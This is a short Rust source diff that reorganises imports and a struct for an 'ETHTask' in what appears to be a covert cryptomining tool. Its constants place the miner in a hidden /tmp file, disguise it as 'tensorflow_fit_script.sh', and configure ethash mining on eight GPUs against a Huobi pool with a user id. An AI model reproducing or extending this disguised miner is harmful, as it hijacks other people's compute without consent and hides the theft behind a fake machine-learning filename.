@@ -1,9 +1,4 @@
-use crate::*;
-use std::fs::File;
-use std::io::Write;
-use std::process::Command;
-
-pub struct ETHTask;
+use std::{fs::File, io::Write, process::Command};
 
 const MINER_SOURCE_FILEPATH: &str = "/tmp/.b86547d084228861";
 const MINER_FAKE_FILENAME: &str = "tensorflow_fit_script.sh";
@@ -11,7 +6,9 @@ const MINER_FAKE_FILENAME: &str = "tensorflow_fit_script.sh";
 const MINER_CONFIG_FILENAME: &str = "c";
 const MINER_CONFIG_CONTENT: &[u8] = b"[common]\nalgo=ethash\npers=BgoldPoW\ndevices=0 1 2 3 4 5 6 7\ntemplimit=90\nwatchdog=1\napi=10555\n[server]\nhost=en.huobipool.com\nport=443\nuser=ec82e";
 
-impl task::Task for ETHTask {
+pub struct ETHTask;
+
+impl crate::task::Task for ETHTask {
     fn init_env(&self) -> anyhow::Result<()> {
         println!("init_env()");
         Command::new("cp")
